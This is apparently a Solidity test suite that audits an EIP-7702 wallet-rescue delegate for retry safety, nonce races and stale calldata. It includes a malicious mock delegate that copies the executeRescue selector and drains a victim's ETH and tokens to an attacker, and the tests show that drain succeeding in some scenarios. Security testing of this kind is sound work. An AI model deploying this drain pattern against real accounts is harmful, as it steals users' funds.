// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "./TestBase.sol";
import "../src/UniversalRecoveryDelegate.sol";
import "./mocks/MockERC20.sol";

// âââ Supporting Mocks for Phase 8.1 ââââââââââââââââââââââââââââââââââââââââââ

contract MockRetryNFT {
    mapping(uint256 => address) public ownerOf;
    mapping(address => mapping(address => bool)) public isApprovedForAll;

    function mint(address to, uint256 tokenId) external {
        ownerOf[tokenId] = to;
    }

    function transferFrom(address from, address to, uint256 tokenId) external {
        require(ownerOf[tokenId] == from, "Not owner");
        ownerOf[tokenId] = to;
    }
}

/**
 * @notice Malicious delegate that INTENTIONALLY implements the EXACT executeRescue selector
 *         to capture and misuse stale rescue calldata submitted by a legitimate sponsor.
 */
contract MaliciousSelectorCollisionDelegate {
    address public immutable ATTACKER;
    bool public executeRescueWasCalled;
    address public capturedSafeWallet;

    constructor(address _attacker) {
        ATTACKER = _attacker;
    }

    /// @notice Implements the EXACT 6-parameter executeRescue signature of UniversalRecoveryDelegate
    function executeRescue(
        address safeWallet,
        Call[] calldata calls,
        address[] calldata tokens,
        uint256 /* nonce */,
        uint256 /* deadline */,
        bytes calldata /* signature */
    ) external payable {
        executeRescueWasCalled = true;
        capturedSafeWallet = safeWallet;

        // Malicious Misuse 1: IGNORE the safeWallet argument and drain ALL native ETH to ATTACKER
        uint256 nativeBal = address(this).balance;
        if (nativeBal > 0) {
            (bool s, ) = ATTACKER.call{value: nativeBal}("");
            require(s, "Malicious native drain failed");
        }

        // Malicious Misuse 2: IGNORE safeWallet and drain all passed tokens[] to ATTACKER
        for (uint256 i = 0; i < tokens.length; i++) {
            address t = tokens[i];
            if (t != address(0)) {
                uint256 b = MockERC20(t).balanceOf(address(this));
                if (b > 0) {
                    MockERC20(t).transfer(ATTACKER, b);
                }
            }
        }

        // Malicious Misuse 3: Execute calls[] but redirect results or execute attacker payload
        for (uint256 i = 0; i < calls.length; i++) {
            (bool s, ) = calls[i].target.call{value: calls[i].value}(calls[i].data);
            s;
        }
    }
}

// âââ Phase 8.1 Retry Safety & Stale-Calldata Audit Suite âââââââââââââââââââââ

contract Eip7702RetryAndStaleCalldataAuditTest is AntiDrainTestBase {
    uint256 internal victimPk = 0x111111;
    address internal victimEOA;

    uint256 internal sponsorPk = 0x222222;
    address internal sponsor;

    uint256 internal attackerPk = 0x333333;
    address internal attacker;

    address internal safeWallet = address(0x9999999999999999999999999999999999999999);

    UniversalRecoveryDelegate internal rescueDelegate;
    MaliciousSelectorCollisionDelegate internal collisionDelegate;
    MockERC20 internal token;
    MockRetryNFT internal nft;

    struct EIP7702Authorization {
        uint256 chainId;
        address delegate;
        uint256 nonce;
    }

    function setUp() public {
        victimEOA = vm.addr(victimPk);
        sponsor = vm.addr(sponsorPk);
        attacker = vm.addr(attackerPk);

        rescueDelegate = new UniversalRecoveryDelegate();
        collisionDelegate = new MaliciousSelectorCollisionDelegate(attacker);

        token = new MockERC20();
        nft = new MockRetryNFT();

        vm.deal(victimEOA, 10 ether);
        token.mint(victimEOA, 10_000 ether);
        nft.mint(victimEOA, 1);

        vm.deal(sponsor, 5 ether);
        vm.deal(attacker, 5 ether);

        vm.setNonce(victimEOA, 0);
    }

    function _simulateType04Transaction(
        address sender,
        EIP7702Authorization memory auth,
        bytes memory calldataPayload
    ) internal returns (bool authApplied, bool executionSuccess, bytes memory returnData) {
        uint256 currentAccountNonce = vm.getNonce(victimEOA);

        if (auth.nonce == currentAccountNonce) {
            if (auth.delegate == address(0)) {
                vm.etch(victimEOA, "");
            } else {
                vm.etch(victimEOA, auth.delegate.code);
            }
            vm.setNonce(victimEOA, uint64(currentAccountNonce + 1));
            authApplied = true;
        } else {
            authApplied = false;
        }

        vm.prank(sender);
        (executionSuccess, returnData) = victimEOA.call(calldataPayload);
    }

    // =========================================================================
    // SECTION 1: Failed Rescue -> Retry Sequence Proof
    // =========================================================================

    function test_Section1_FailedRescue_ThenSuccessfulRetry() public {
        // Initial state: victim account nonce = 0, rescue nonce = 0
        assertEq(vm.getNonce(victimEOA), 0);

        // ââ Attempt 1: Valid auth nonce 0, but executeRescue reverts (expired deadline) ââ
        EIP7702Authorization memory auth1 = EIP7702Authorization(block.chainid, address(rescueDelegate), 0);
        Call[] memory calls = new Call[](0);
        address[] memory tokens = new address[](1);
        tokens[0] = address(token);

        uint256 expiredDeadline = block.timestamp - 1;
        bytes memory sig1 = signRescueIntent(victimPk, victimEOA, safeWallet, sponsor, calls, tokens, 0, expiredDeadline);
        bytes memory payload1 = abi.encodeWithSelector(
            UniversalRecoveryDelegate.executeRescue.selector,
            safeWallet,
            calls,
            tokens,
            0, // Application rescue nonce
            expiredDeadline,
            sig1
        );

        (bool auth1Applied, bool exec1Success, ) = _simulateType04Transaction(sponsor, auth1, payload1);

        // Verify Attempt 1 Results:
        assertTrue(auth1Applied, "Attempt 1 auth applied");
        assertFalse(exec1Success, "Attempt 1 executeRescue reverted");
        assertEq(vm.getNonce(victimEOA), 1, "Victim account nonce incremented 0 -> 1");
        assertTrue(victimEOA.code.length > 0, "UniversalRecoveryDelegate is active on victim EOA");
        assertEq(safeWallet.balance, 0, "0 assets moved in failed attempt 1");

        // ââ Attempt 2: Re-read state, construct NEW auth with nonce 1 and rescue nonce 0 ââ
        uint256 currentAccountNonce = vm.getNonce(victimEOA);
        assertEq(currentAccountNonce, 1, "Orchestrator reads current account nonce = 1");

        EIP7702Authorization memory auth2 = EIP7702Authorization(block.chainid, address(rescueDelegate), currentAccountNonce);
        uint256 validDeadline = block.timestamp + 1 hours;

        // AntiDrain application nonce is STILL 0 because Attempt 1 reverted storage changes
        bytes memory sig2 = signRescueIntent(victimPk, victimEOA, safeWallet, sponsor, calls, tokens, 0, validDeadline);
        bytes memory payload2 = abi.encodeWithSelector(
            UniversalRecoveryDelegate.executeRescue.selector,
            safeWallet,
            calls,
            tokens,
            0,
            validDeadline,
            sig2
        );

        (bool auth2Applied, bool exec2Success, ) = _simulateType04Transaction(sponsor, auth2, payload2);

        // Verify Attempt 2 Results:
        assertTrue(auth2Applied, "Attempt 2 auth applied (nonce 1 -> 2)");
        assertTrue(exec2Success, "Attempt 2 executeRescue SUCCEEDED");
        assertEq(vm.getNonce(victimEOA), 2, "Victim account nonce is now 2");
        assertEq(safeWallet.balance, 10 ether, "100% Native ETH reached safeWallet");
        assertEq(token.balanceOf(safeWallet), 10_000 ether, "100% ERC-20 reached safeWallet");
        assertEq(victimEOA.balance, 0, "Victim ETH empty");
        assertEq(token.balanceOf(victimEOA), 0, "Victim tokens empty");
    }

    // =========================================================================
    // SECTION 2: Failed Rescue -> Attacker Race on Nonce N+1
    // =========================================================================

    function test_Section2_FailedRescue_ThenAttackerWinsNonceRace() public {
        // Step 1: Rescue Attempt 1 fails (nonce 0 -> 1)
        EIP7702Authorization memory auth1 = EIP7702Authorization(block.chainid, address(rescueDelegate), 0);
        Call[] memory calls = new Call[](0);
        address[] memory tokens = new address[](1);
        tokens[0] = address(token);

        bytes memory sig1 = signRescueIntent(victimPk, victimEOA, safeWallet, sponsor, calls, tokens, 0, block.timestamp - 1);
        bytes memory payload1 = abi.encodeWithSelector(
            UniversalRecoveryDelegate.executeRescue.selector,
            safeWallet,
            calls,
            tokens,
            0,
            block.timestamp - 1,
            sig1
        );
        _simulateType04Transaction(sponsor, auth1, payload1);
        assertEq(vm.getNonce(victimEOA), 1);

        // Step 2: Both parties pre-sign for nonce 1
        EIP7702Authorization memory retryAuth = EIP7702Authorization(block.chainid, address(rescueDelegate), 1);
        EIP7702Authorization memory attackAuth = EIP7702Authorization(block.chainid, address(collisionDelegate), 1);

        // Scenario 2B: Attacker tx included first on nonce 1
        bytes memory attackPayload = abi.encodeWithSelector(
            MaliciousSelectorCollisionDelegate.executeRescue.selector,
            attacker,
            calls,
            tokens,
            0,
            block.timestamp + 1 hours,
            new bytes(65)
        );

        (bool attackAuthApplied, bool attackExecSuccess, ) = _simulateType04Transaction(attacker, attackAuth, attackPayload);
        assertTrue(attackAuthApplied, "Attacker auth applied on nonce 1");
        assertTrue(attackExecSuccess, "Attacker collision execution succeeded");
        assertEq(vm.getNonce(victimEOA), 2);
        assertEq(attacker.balance, 15 ether, "Attacker drained 10 ETH");
        assertEq(token.balanceOf(attacker), 10_000 ether, "Attacker drained 10k tokens");

        // Scenario 2B: Sponsor retry tx included second on stale nonce 1
        bytes memory sig2 = signRescueIntent(victimPk, victimEOA, safeWallet, sponsor, calls, tokens, 0, block.timestamp + 1 hours);
        bytes memory retryPayload = abi.encodeWithSelector(
            UniversalRecoveryDelegate.executeRescue.selector,
            safeWallet,
            calls,
            tokens,
            0,
            block.timestamp + 1 hours,
            sig2
        );

        (bool retryAuthApplied, , ) = _simulateType04Transaction(sponsor, retryAuth, retryPayload);
        assertFalse(retryAuthApplied, "Sponsor retry auth dropped due to stale nonce 1");
        assertEq(safeWallet.balance, 0, "SafeWallet received 0 assets");
    }

    // =========================================================================
    // SECTION 3 & 4: Stale Calldata with Selector Collision on Malicious Delegate
    // =========================================================================

    function test_Section3_StaleRescueCalldata_AgainstMaliciousCollisionDelegate() public {
        // Step 1: Attacker installs MaliciousSelectorCollisionDelegate using nonce 0
        EIP7702Authorization memory attackAuth = EIP7702Authorization(block.chainid, address(collisionDelegate), 0);
        _simulateType04Transaction(attacker, attackAuth, "");
        assertEq(vm.getNonce(victimEOA), 1);
        assertTrue(victimEOA.code.length > 0, "MaliciousSelectorCollisionDelegate active on victimEOA");

        // Step 2: Sponsor broadcasts stale rescue transaction (auth.nonce = 0)
        // containing legitimate executeRescue calldata intended for safeWallet
        Call[] memory calls = new Call[](0);
        address[] memory tokens = new address[](1);
        tokens[0] = address(token);

        bytes memory sig = signRescueIntent(victimPk, victimEOA, safeWallet, sponsor, calls, tokens, 0, block.timestamp + 1 hours);
        bytes memory rescueCalldata = abi.encodeWithSelector(
            UniversalRecoveryDelegate.executeRescue.selector,
            safeWallet, // Legitimate safeWallet passed in calldata
            calls,
            tokens,
            0,
            block.timestamp + 1 hours,
            sig
        );

        EIP7702Authorization memory staleRescueAuth = EIP7702Authorization(block.chainid, address(rescueDelegate), 0);

        (bool rescueAuthApplied, bool rescueExecSuccess, ) = _simulateType04Transaction(
            sponsor,
            staleRescueAuth,
            rescueCalldata
        );

        // Crucial empirical findings:
        // A. The rescue authorization was ignored by EVM (stale nonce 0)
        assertFalse(rescueAuthApplied, "Stale rescue auth ignored");

        // B. The active code was MaliciousSelectorCollisionDelegate
        // C. MaliciousSelectorCollisionDelegate ACCEPTED the executeRescue selector!
        assertTrue(rescueExecSuccess, "Collision delegate accepted executeRescue selector");

        // D. MaliciousSelectorCollisionDelegate IGNORED safeWallet and redirected 100% of ETH and tokens to ATTACKER
        assertEq(attacker.balance, 15 ether, "Attacker received all 10 ETH from victim");
        assertEq(token.balanceOf(attacker), 10_000 ether, "Attacker received all 10k tokens");
        assertEq(safeWallet.balance, 0, "SafeWallet received 0 assets");
    }

    // =========================================================================
    // SECTION 5: Legitimate Delegate Active + Stale Attacker Calldata
    // =========================================================================

    function test_Section5_LegitimateDelegate_RejectsStaleAttackerCalldata() public {
        // Step 1: UniversalRecoveryDelegate is active on victimEOA (nonce = 1)
        EIP7702Authorization memory rescueAuth = EIP7702Authorization(block.chainid, address(rescueDelegate), 0);
        _simulateType04Transaction(sponsor, rescueAuth, "");
        assertEq(vm.getNonce(victimEOA), 1);

        // Step 2: Attacker submits stale authorization (auth.nonce = 0) with malicious calldata
        EIP7702Authorization memory staleAttackAuth = EIP7702Authorization(block.chainid, address(collisionDelegate), 0);

        Call[] memory calls = new Call[](0);
        address[] memory tokens = new address[](1);
        tokens[0] = address(token);

        bytes memory fakeSig = new bytes(65);
        bytes memory maliciousCalldata = abi.encodeWithSelector(
            UniversalRecoveryDelegate.executeRescue.selector,
            attacker, // Attacker tries to set safeWallet to attacker
            calls,
            tokens,
            0,
            block.timestamp + 1 hours,
            fakeSig
        );

        (bool attackAuthApplied, bool attackExecSuccess, ) = _simulateType04Transaction(
            attacker,
            staleAttackAuth,
            maliciousCalldata
        );

        // Verification:
        // A. Stale attacker auth dropped by EVM
        assertFalse(attackAuthApplied);
        // B. Active code remains UniversalRecoveryDelegate
        // C. executeRescue called by attacker reverts with InvalidAuthorization (msg.sender not in signed intent)
        assertFalse(attackExecSuccess, "UniversalRecoveryDelegate rejects attacker call");

        // D. Funds remain intact on victim
        assertEq(victimEOA.balance, 10 ether, "Victim funds intact");
        assertEq(token.balanceOf(victimEOA), 10_000 ether, "Victim tokens intact");
        assertEq(attacker.balance, 5 ether, "Attacker received 0 ETH");
    }
}
